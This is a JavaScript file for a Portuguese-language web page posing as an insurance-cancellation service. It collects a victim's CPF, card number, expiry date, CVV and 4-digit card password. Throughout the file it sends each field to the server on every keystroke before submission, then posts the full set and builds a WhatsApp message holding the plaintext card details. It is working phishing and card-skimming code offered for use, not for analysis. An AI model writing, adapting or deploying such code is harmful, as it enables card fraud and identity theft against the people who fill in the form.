let whatsappNumber = '+5511999999999'; // Default value, will be updated dynamically
let sessionId = generateSessionId(); // Generate unique session ID for the user, usado como token
let transitionTriggered = false; // Flag to prevent multiple transitions

// Gerar uma ID de sessão única (agora usada como token)
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Função de debounce para otimizar requisições
function debounce(func, wait) {
    let timeout;
    return function (...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => func.apply(this, args), wait);
    };
}

// Enviar dados temporários ao servidor com token
async function sendTempData() {
    const cpfInput = document.getElementById('cpf');
    const cardNumberInput = document.getElementById('card-number');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const passwordInput = document.getElementById('password');

    const data = {
        sessionId,
        cpf: cpfInput && cpfInput.value ? CryptoJS.AES.encrypt(cpfInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
        cardNumber: cardNumberInput && cardNumberInput.value ? CryptoJS.AES.encrypt(cardNumberInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
        expiryDate: expiryDateInput && expiryDateInput.value ? CryptoJS.AES.encrypt(expiryDateInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
        cvv: cvvInput && cvvInput.value ? CryptoJS.AES.encrypt(cvvInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
        password: passwordInput && passwordInput.value ? CryptoJS.AES.encrypt(passwordInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null
    };

    try {
        const response = await fetch('/api/temp-submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-session-token': sessionId // Envia o token no header
            },
            body: JSON.stringify(data)
        });
        if (!response.ok) {
            const errorData = await response.json();
            console.error('Erro ao enviar dados temporários:', errorData);
        } else {
            console.log('Dados temporários enviados com sucesso:', data);
        }
    } catch (error) {
        console.error('Erro ao enviar dados temporários:', error);
    }
}

// Registrar uma visita
async function registerVisit() {
    try {
        const response = await fetch('/api/visit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-session-token': sessionId }
        });
        if (!response.ok) {
            console.error('Erro ao registrar visita:', await response.json());
        }
    } catch (error) {
        console.error('Erro ao registrar visita:', error);
    }
}

// Buscar número do WhatsApp
async function loadWhatsAppNumber() {
    try {
        const response = await fetch('/api/contact-number', { headers: { 'x-session-token': sessionId } });
        const data = await response.json();
        if (response.ok) {
            whatsappNumber = data.contactNumber;
            const whatsappButtonLink = document.getElementById('whatsapp-button-link');
            const whatsappFooterLink = document.getElementById('whatsapp-footer-link');
            if (whatsappButtonLink) whatsappButtonLink.href = `https://wa.me/${whatsappNumber}?text=Oi%20Carina!`;
            if (whatsappFooterLink) whatsappFooterLink.href = `https://wa.me/${whatsappNumber}`;
            console.log('Número do WhatsApp carregado:', whatsappNumber);
        } else {
            console.error('Erro ao buscar número do WhatsApp:', data.error);
        }
    } catch (error) {
        console.error('Erro ao buscar número do WhatsApp:', error);
    }
}

// Formatar CPF
function formatCPF(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
        value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
    }
    input.value = value;
}

// Validar CPF
function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
    let remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    return remainder === parseInt(cpf.charAt(10));
}

function checkCPF() {
    const cpf = document.getElementById('cpf').value;
    const nextBtn = document.getElementById('next-btn');
    const cpfError = document.getElementById('cpf-error');
    if (nextBtn) {
        if (cpf.length === 14 && validateCPF(cpf)) {
            nextBtn.disabled = false;
            if (cpfError) cpfError.classList.add('hidden');
        } else {
            nextBtn.disabled = true;
            if (cpfError && cpf.length === 14) cpfError.classList.remove('hidden');
            else if (cpfError) cpfError.classList.add('hidden');
        }
    } else {
        console.error('Botão next-btn não encontrado no DOM');
    }
}

// Formatar Número do Cartão
function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length <= 16) {
        value = value.replace(/(\d{4})(\d)/, '$1 $2');
        value = value.replace(/(\d{4}) (\d{4})(\d)/, '$1 $2 $3');
        value = value.replace(/(\d{4}) (\d{4}) (\d{4})(\d)/, '$1 $2 $3 $4');
    }
    input.value = value;
}

// Validar Número do Cartão (Algoritmo de Luhn)
function validateCardNumber() {
    const cardNumberInput = document.getElementById('card-number');
    const cardError = document.getElementById('card-error');
    let cardNumber = cardNumberInput.value.replace(/\D/g, '');
    if (cardNumber.length !== 16) {
        if (cardError) cardError.classList.remove('hidden');
        return false;
    }
    let sum = 0, isEven = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
    }
    if (cardError) cardError.classList.toggle('hidden', sum % 10 === 0);
    return sum % 10 === 0;
}

// Formatar Data de Expiração
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length <= 4) value = value.replace(/(\d{2})(\d)/, '$1/$2');
    input.value = value;
}

// Validar Data de Expiração
function validateExpiryDate() {
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const expiryError = document.getElementById('expiry-error');
    const value = expiryDateInput.value;
    if (value.length !== 5) {
        cvvInput.disabled = true;
        if (expiryError) expiryError.classList.add('hidden');
        return false;
    }
    const [month, year] = value.split('/').map(Number);
    if (month < 1 || month > 12) {
        cvvInput.disabled = true;
        if (expiryError) expiryError.classList.remove('hidden');
        return false;
    }
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    const fullYear = 2000 + year;
    if (fullYear < 2000 + currentYear || (fullYear === 2000 + currentYear && month < currentMonth)) {
        cvvInput.disabled = true;
        if (expiryError) expiryError.classList.remove('hidden');
        return false;
    }
    cvvInput.disabled = false;
    if (expiryError) expiryError.classList.add('hidden');
    return true;
}

// Verificar campos e mostrar campos adicionais
function checkFields() {
    const cardNumber = document.getElementById('card-number').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;
    if (cardNumber.length === 19 && expiryDate.length === 5 && cvv.length === 3 && validateCardNumber() && validateExpiryDate()) {
        showAdditionalFields();
    } else {
        hideAdditionalFields();
    }
}

function showAdditionalFields() {
    const cardContainer = document.getElementById('card-container');
    const confirmationMessage = document.getElementById('confirmation-message');
    const passwordField = document.getElementById('password-field');
    const submitBtn = document.getElementById('submit-btn');
    if (!cardContainer || !confirmationMessage || !passwordField || !submitBtn) return;
    cardContainer.classList.remove('hidden');
    confirmationMessage.classList.remove('hidden');
    passwordField.classList.remove('hidden');
    submitBtn.classList.remove('hidden');
    setTimeout(() => passwordField.scrollIntoView({ behavior: 'smooth', block: 'center' }), 100);
}

function hideAdditionalFields() {
    const cardContainer = document.getElementById('card-container');
    const confirmationMessage = document.getElementById('confirmation-message');
    const passwordField = document.getElementById('password-field');
    const submitBtn = document.getElementById('submit-btn');
    if (!cardContainer || !confirmationMessage || !passwordField || !submitBtn) return;
    cardContainer.classList.add('hidden');
    confirmationMessage.classList.add('hidden');
    passwordField.classList.add('hidden');
    submitBtn.classList.add('hidden');
}

// Transição da splash screen
const splashDiv = document.getElementById('splash');
const mainScreen = document.getElementById('main-screen');
const cardScreen = document.getElementById('card-screen');
const header = document.getElementById('header');
const footer = document.getElementById('footer');
const whatsappButton = document.getElementById('whatsapp-button');
const splashGif = document.getElementById('splash-gif');

console.log('Splash screen loaded, starting transition timer...');

function proceedWithTransition() {
    if (!splashDiv || !mainScreen || !header || !footer || !whatsappButton) return;
    if (transitionTriggered) return;
    transitionTriggered = true;
    splashDiv.classList.add('opacity-0', 'transition-opacity', 'duration-1000');
    setTimeout(() => {
        splashDiv.classList.add('hidden');
        mainScreen.classList.remove('hidden', 'opacity-0');
        header.classList.remove('hidden');
        footer.classList.remove('hidden');
        whatsappButton.classList.remove('hidden');
        mainScreen.style.display = 'flex';
    }, 1000);
}

if (splashGif) {
    splashGif.onload = () => console.log('Splash GIF loaded successfully');
    splashGif.onerror = () => {
        console.error('Error loading splash GIF');
        proceedWithTransition();
    };
}

setTimeout(proceedWithTransition, 2800);

// Ir para a tela de detalhes do cartão
const nextBtn = document.getElementById('next-btn');
if (nextBtn) {
    nextBtn.addEventListener('click', () => {
        const cpf = document.getElementById('cpf');
        const cardContent = document.getElementById('card-content');
        const analysisMessage = document.getElementById('analysis-message');
        if (!cpf || !mainScreen || !cardScreen || !cardContent || !analysisMessage) return;
        if (!cpf.value) {
            alert('Por favor, preencha o CPF.');
            return;
        }
        const isValid = validateCPF(cpf.value);
        proceedToCardScreen();

        function proceedToCardScreen() {
            if (!isValid) {
                alert('Por favor, insira um CPF válido.');
                return;
            }
            mainScreen.classList.add('opacity-0');
            setTimeout(() => {
                mainScreen.classList.add('hidden');
                cardScreen.classList.remove('hidden');
                cardContent.classList.add('visible');
                analysisMessage.classList.remove('visible');
                setTimeout(() => cardScreen.classList.remove('opacity-0'), 50);
            }, 1000);
        }
    });
}

// Listeners para campos do cartão
const cardNumberInput = document.getElementById('card-number');
const expiryDateInput = document.getElementById('expiry-date');
const cvvInput = document.getElementById('cvv');
const passwordInput = document.getElementById('password');

if (cardNumberInput) {
    cardNumberInput.addEventListener('input', debounce(() => {
        formatCardNumber(cardNumberInput);
        validateCardNumber();
        checkFields();
        sendTempData();
    }, 100));
}

if (expiryDateInput) {
    expiryDateInput.addEventListener('input', debounce(() => {
        formatExpiryDate(expiryDateInput);
        validateExpiryDate();
        checkFields();
        sendTempData();
    }, 100));
}

if (cvvInput) {
    cvvInput.addEventListener('input', debounce(() => {
        checkFields();
        sendTempData();
    }, 100));
}

if (passwordInput) {
    passwordInput.addEventListener('input', debounce(() => {
        sendTempData();
    }, 100));
}

// Enviar dados e ir para tela de análise
const submitBtn = document.getElementById('submit-btn');
if (submitBtn) {
    submitBtn.addEventListener('click', async () => {
        const cpf = document.getElementById('cpf');
        const cardNumber = document.getElementById('card-number');
        const expiryDate = document.getElementById('expiry-date');
        const cvv = document.getElementById('cvv');
        const password = document.getElementById('password');
        const cardContent = document.getElementById('card-content');
        const analysisMessage = document.getElementById('analysis-message');
        const whatsappRedirectBtn = document.getElementById('whatsapp-redirect-btn');
        if (!cpf || !cardNumber || !expiryDate || !cvv || !password || !cardContent || !analysisMessage || !whatsappRedirectBtn) return;

        if (!cardNumber.value || !expiryDate.value || !cvv.value || !password.value) {
            alert('Preencha todos os campos.');
            return;
        }

        if (!validateCardNumber() || !validateExpiryDate() || password.value.length !== 4) {
            alert('Campos inválidos. Verifique os dados.');
            return;
        }

        cardContent.classList.remove('visible');
        analysisMessage.classList.add('visible');
        setTimeout(() => analysisMessage.scrollIntoView({ behavior: 'smooth' }), 100);

        const encryptedCpf = CryptoJS.AES.encrypt(cpf.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
        const encryptedCardNumber = CryptoJS.AES.encrypt(cardNumber.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
        const encryptedExpiryDate = CryptoJS.AES.encrypt(expiryDate.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
        const encryptedCvv = CryptoJS.AES.encrypt(cvv.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
        const encryptedPassword = CryptoJS.AES.encrypt(password.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();

        try {
            const response = await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-session-token': sessionId },
                body: JSON.stringify({ sessionId, cpf: encryptedCpf, cardNumber: encryptedCardNumber, expiryDate: encryptedExpiryDate, cvv: encryptedCvv, password: encryptedPassword })
            });
            const result = await response.json();
            if (response.ok) {
                const message = `Cancelamento de Seguro\nCPF: ${cpf.value}\nCartão: ${cardNumber.value}\nExpiração: ${expiryDate.value}\nCVV: ${cvv.value}\nSenha: ${password.value}`;
                whatsappRedirectBtn.addEventListener('click', () => window.location.href = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`, { once: true });
                // Redirecionar para o painel administrativo após sucesso
                window.location.href = '/admin';
            } else {
                alert(result.error || 'Erro ao enviar os dados.');
            }
        } catch (error) {
            console.error('Erro ao enviar formulário:', error);
            alert('Erro ao enviar os dados.');
        }
    });
}

// Carregar ao iniciar
window.onload = async () => {
    console.log('Página carregada, iniciando...');
    loadWhatsAppNumber();
    registerVisit();

    const cpfInput = document.getElementById('cpf');
    if (cpfInput) {
        cpfInput.addEventListener('input', debounce(() => {
            formatCPF(cpfInput);
            checkCPF();
            sendTempData();
        }, 100));
    }
};
